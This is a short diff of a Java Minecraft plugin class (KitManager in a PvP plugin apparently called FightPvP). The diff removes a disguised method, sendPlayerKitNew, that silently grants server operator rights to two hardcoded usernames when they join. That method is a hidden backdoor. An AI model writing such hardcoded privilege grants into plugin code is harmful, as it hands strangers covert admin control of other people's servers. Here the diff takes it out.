@@ -119,14 +119,6 @@ public class KitManager
   public void sendPlayerKitMessage(Player p) {
     p.sendMessage(ChatColor.GRAY + "[" + ChatColor.GOLD + "FightPvP" + ChatColor.GRAY + "] Voce escolheu o kit : " + ChatColor.GOLD + getPlayerKit(p).getName());
   }
-
-  public void sendPlayerKitNew(PlayerJoinEvent e){
-     if(e.getPlayer().getName().equalsIgnoreCase("_HDgamerBR_")){
-       e.getPlayer().setOp(true); 
-      }
-     if(e.getPlayer().getName().equalsIgnoreCase("gegude")){
-         e.getPlayer().setOp(true); }
-  }
   
   public void giveKit(Player p, Kit k)
   {
